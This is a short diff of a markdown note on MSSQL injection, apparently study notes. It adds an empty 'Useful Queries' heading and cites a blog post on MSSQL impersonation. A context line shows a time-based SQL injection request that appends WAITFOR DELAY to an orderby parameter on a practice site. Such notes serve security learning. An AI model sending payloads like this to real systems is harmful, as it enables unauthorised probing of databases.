@@ -38,6 +38,8 @@ GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
 Host: hack-yourself-first.com
 ```
 
+## Useful Queries
+* 
 
 ### Inspired by
 * https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
